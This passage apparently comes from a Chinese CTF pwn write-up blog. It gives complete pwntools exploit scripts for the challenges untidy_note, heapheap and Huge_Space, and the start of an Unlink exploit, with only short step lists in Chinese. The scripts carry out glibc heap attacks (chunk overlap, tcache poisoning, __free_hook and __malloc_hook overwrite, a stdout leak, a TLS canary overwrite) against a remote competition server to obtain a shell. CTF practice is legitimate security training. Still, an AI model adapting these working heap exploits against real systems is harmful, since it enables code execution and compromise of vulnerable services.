class="hljs-number">0xd8</span>)+p64(leave))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="untidy-note"><a href="#untidy-note" class="headerlink" title="untidy_note"></a>untidy_note</h2><p>IDA分析完看到对堆进行了一些列操作，这是一个堆漏洞，构造exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>ip = <span class="hljs-string">&#x27;123.57.69.203&#x27;</span><br>port = <span class="hljs-string">&#x27;7030&#x27;</span><br>reomote_addr = [ip,port]<br>binary = <span class="hljs-string">&#x27;./untidy_note&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>elf = ELF(binary)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p = process(binary)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">2</span> :<br>    p = remote(reomote_addr[<span class="hljs-number">0</span>],reomote_addr[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>ru = <span class="hljs-keyword">lambda</span> x : p.recvuntil(x,timeout=<span class="hljs-number">0.2</span>)<br>sd = <span class="hljs-keyword">lambda</span> x : p.send(x)<br>rl = <span class="hljs-keyword">lambda</span>   : p.recvline()<br>sl = <span class="hljs-keyword">lambda</span> x : p.sendline(x)<br>rv = <span class="hljs-keyword">lambda</span> x : p.recv(x)<br>sa = <span class="hljs-keyword">lambda</span> a,b : p.sendafter(a,b)<br>sla = <span class="hljs-keyword">lambda</span> a,b : p.sendlineafter(a,b)<br>it = <span class="hljs-keyword">lambda</span> :p.interactive()<br>ru7f = <span class="hljs-keyword">lambda</span> : u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>rv6 = <span class="hljs-keyword">lambda</span> : u64(rv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span>)<br>lg = <span class="hljs-keyword">lambda</span> s: log.info(<span class="hljs-string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>bp = <span class="hljs-keyword">lambda</span> src=<span class="hljs-literal">None</span> : attach(p,src)<br>sym = <span class="hljs-keyword">lambda</span> name : libc.sym[name]<br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params">offset</span>):<br>    addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    base = addr - offset<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+]libc_base=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(base)<br>    <span class="hljs-keyword">return</span> base<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;Your choose is:\n&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&quot;the note size is:\n&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&quot;index:\n\n&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    ru(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    ru(<span class="hljs-string">&quot;the size is:\n&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>    sl(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    ru(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># attach(p)#,&#x27;b *$rebase(0x0000000000000A8B)&#x27;)</span><br>sla(<span class="hljs-string">&quot;Your name is:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;Epiphany&quot;</span>))<br><span class="hljs-comment">#--leak</span><br>add(<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>):<br>    add(<span class="hljs-number">0x20</span>-<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#26</span><br>payload =  <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4b1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">1</span>)<br><br>show(<span class="hljs-number">1</span>)<br>offset = libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] +<span class="hljs-number">0x10</span> + <span class="hljs-number">96</span><br>libc_base = leak(offset)<br><br>free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base<br><br>free(<span class="hljs-number">26</span>)<br><span class="hljs-comment"># free(3)</span><br><span class="hljs-comment">#num = 27</span><br>payload = p64(free_hook)<br>edit(<span class="hljs-number">26</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#25</span><br>pause()<br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#26</span><br>payload = p64(system)<br>edit(<span class="hljs-number">26</span>,<span class="hljs-built_in">len</span>(payload),payload) <br>pause()<br>edit(<span class="hljs-number">9</span>,<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>),<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>pause()<br>free(<span class="hljs-number">9</span>)<br>it()<br></code></pre></td></tr></table></figure>

<h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h2><ol>
<li>布置堆布局，通过一次释放堆块，合并，在下个chunk的prev_size留下size，为overlap做准备</li>
<li>重新申请回去，接着释放开头chunk，offbynull覆盖第三个chunk的inuse位，free掉第三个chunk，造成overlap，中间第二个chunk会overlap。</li>
<li>在unsortedbin中制造与tcachebin的chunk overlap，将stdout后12bit偏移链入tcache</li>
<li>申请到stdout，泄露libc，之后再构造chunk overlap，将frehook改为system</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&quot;./heapheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p, <span class="hljs-string">&quot;b main&quot;</span>)<br><span class="hljs-comment"># gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Please input your choice: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Please input the size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Please input your choice: &quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Please input the index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    add(<span class="hljs-number">0x4f8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 0</span><br>    add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 1</span><br>    add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 2</span><br>    add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 3</span><br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0x700</span>))  <span class="hljs-comment"># 2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">10</span>):<br>        free(i)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">0x4f8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 0</span><br>    add(<span class="hljs-number">0x28</span>, p16(<span class="hljs-number">0xa760</span>))  <span class="hljs-comment"># 1</span><br>    add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 3</span><br>    add(<span class="hljs-number">0xf8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>)  <span class="hljs-comment"># 4</span><br>    libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ed8b0</span><br>    log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> % libc_base)<br>    mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    ogg = libc_base + <span class="hljs-number">0x10a41c</span><br><br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0x1f8</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0xc8</span> + p64(<span class="hljs-number">0x101</span>) + p64(mlh))  <span class="hljs-comment"># 2</span><br>    add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5</span><br>    add(<span class="hljs-number">0xf8</span>, p64(ogg))  <span class="hljs-comment"># 6</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Please input your choice: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Please input the size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x58</span>))<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># p = process(argv=[ld.path,elf.path], env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>        p = remote(<span class="hljs-string">&quot;123.57.69.203&quot;</span>, <span class="hljs-number">5320</span>)<br>        attack()<br>        p.sendline(<span class="hljs-string">&quot;cat flag.txt&quot;</span>)<br>        p.interactive()<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        p.close()<br></code></pre></td></tr></table></figure>

<h2 id="Huge-Space"><a href="#Huge-Space" class="headerlink" title="Huge_Space"></a>Huge_Space</h2><ol>
<li>溢出栈，布置栈迁移 rop </li>
<li>堆溢出覆盖 topchunk，free 到 unsortedbin，申请出来泄露 libc </li>
<li>申请大内存，溢出覆盖 tls 结构的 canary</li>
<li>输入 cmd，在 cmd 后面构造调用 execve 的 rop </li>
<li>exit 返回到 main 函数，绕过 canary，栈迁移到 bss，调用 ececv</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <br>context.terminal = [<span class="hljs-string">&quot;/bin/tmux&quot;</span>,<span class="hljs-string">&quot;sp&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>] <br>io = remote(<span class="hljs-string">&#x27;123.57.69.203&#x27;</span>,<span class="hljs-number">5330</span> ) <br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>) <br><span class="hljs-comment"># io = process(&#x27;./Huge_Space&#x27;) </span><br><span class="hljs-comment">#libc = ELF(&#x27;.bc.so.6&#x27;) </span><br>elf = ELF(<span class="hljs-string">&#x27;./Huge_Space&#x27;</span>) <br>l64 = <span class="hljs-keyword">lambda</span> :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>)) <br>l32 = <span class="hljs-keyword">lambda</span> :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>)) <br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span> : io.recvline(a) <br>ru = <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span> : io.recvuntil(a,b) <br>rn = <span class="hljs-keyword">lambda</span> x : io.recvn(x) <br>sn = <span class="hljs-keyword">lambda</span> x : io.send(x) <br>sl = <span class="hljs-keyword">lambda</span> x : io.sendline(x) <br>sa = <span class="hljs-keyword">lambda</span> a,b : io.sendafter(a,b) <br>sla = <span class="hljs-keyword">lambda</span> a,b : io.sendlineafter(a,b) <br>irt = <span class="hljs-keyword">lambda</span> : io.interactive() <br>dbg = <span class="hljs-keyword">lambda</span> text=<span class="hljs-literal">None</span> : gdb.attach(io, text) <br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s))) <br>uu32 = <span class="hljs-keyword">lambda</span> data : u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) <br>uu64 = <span class="hljs-keyword">lambda</span> data : u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) <br>ur64 = <span class="hljs-keyword">lambda</span> data : u64(data.rjust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>): <br>    sl(<span class="hljs-string">&#x27;+++&#x27;</span>) <br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx)) <br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size)) <br>    sla(<span class="hljs-string">&#x27;Data: &#x27;</span>,content) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx,size</span>): <br>    sl(<span class="hljs-string">&#x27;print&#x27;</span>) <br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx)) <br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size)) <br>pop_rdi = <span class="hljs-number">0x0000000000400be3</span> <br>pop_rsi_r15 = <span class="hljs-number">0x0000000000400be1</span> <br>pop_rdx = <span class="hljs-number">0x0000000000001b96</span> <br>pop_rbp = <span class="hljs-number">0x0000000000400860</span> <br>leaveret = <span class="hljs-number">0x40090F</span> <br>sh = <span class="hljs-number">0x400909</span> <br>writee = <span class="hljs-number">0x400B19</span> <br><span class="hljs-comment"># dbg() </span><br>sl(<span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">8</span>*<span class="hljs-number">9</span>)+p64(pop_rbp)+p64(<span class="hljs-number">0x6010c0</span>+<span class="hljs-number">0x10</span>)+p64(leaveret)) <br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xd81</span>))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-string">&#x27;B&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xd50</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#add(2,0x1fa0,&#x27;&#x27;)</span><br>show(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>) <br><span class="hljs-comment"># show(2,0x20) </span><br><span class="hljs-comment"># irt() </span><br>libcbase = l64() - <span class="hljs-number">0x3ebc00</span> <br>lg(<span class="hljs-string">&#x27;libcbase&#x27;</span>) <br>execve = libcbase + libc.symbols[<span class="hljs-string">&#x27;execve&#x27;</span>] <br>lg(<span class="hljs-string">&#x27;execve&#x27;</span>) <br>sl(<span class="hljs-string">&#x27;666&#x27;</span>) <br><span class="hljs-comment"># dbg() </span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x22000</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x24518</span>+<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>) <br>sl(<span class="hljs-string">&#x27;exit\x00\x00\x00\x00/bin\x00&#x27;</span>+p64(pop_rdi)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x6010c0</span>+<span class="hljs-number">8</span>)+ p64(pop_rsi_r15)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(pop_rdx+libcbase)+p64(<span class="hljs-number">0</span>)+p64(execve)) <br>irt()<br><br></code></pre></td></tr></table></figure>

<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># *- coding:utf-8 -*-</span><br><span class="hljs-comment"># from pwn_debug import *</span><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys;<span class="hljs-keyword">import</span> time;<span class="hljs-keyword">import</span> os<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment"># context(os=&quot;linux&quot;,arch=&quot;i386&quot;,log_level=&quot;debug&quot;)</span><br>filename = <span class="hljs-string">&quot;unlink&quot;</span><br>libcpath = <span class="hljs-string">&quot;&quot;</span><br>sh = <span class="hljs-number">0</span><br>lib = <span class="hljs-number">0</span><br>elf = ELF(filename)  <span class="hljs-comment"># local长</span><br>local_libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)  <span class="hljs-comment">#</span><br><span class="hljs-comment">#  remote_buu_libc = ELF(&quot;/home/rencvn/Desktop/install/libc-2.27.so&quot;,checksec = False)</span><br><span class="hljs-comment">#  libc = ELF(&quot;/home/rencvn/Desktop/BUU/Glibc/Ubuntu18_GLIBC_2.27-3ubuntu1/64/libc-2.27.so&quot;)</span><br>u16_local_one = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>] <span class="hljs-comment"># one_gadget (-l2) /lib/x86_64-linux-gnu/libc.so.6 giantbranch  2.23-0ubuntu10</span><br>u18_local_one = [<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>] <span class="hljs-comment"># one_gadget (-l2) /lib/x86_64-linux-gnu/libc.so.6        Rencvn       2.27-3ubuntu1.5</span><br>u20_local_one = [<span class="hljs-number">0xe3b2e</span>,<span class="hljs-number">0xe3b31</span>,<span class="hljs-number">0xe3b34</span>]  <span class="hljs-comment"># one_gadget (-l2) /lib/x86_64-linux-gnu/libc.so.6        Ln-Pwn       2.31-0ubuntu9.7</span><br><br><span class="hljs-string">&quot;&quot;&quot; &quot;&quot;&quot;</span><br>l64 = <span class="hljs-keyword">lambda</span>                :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span 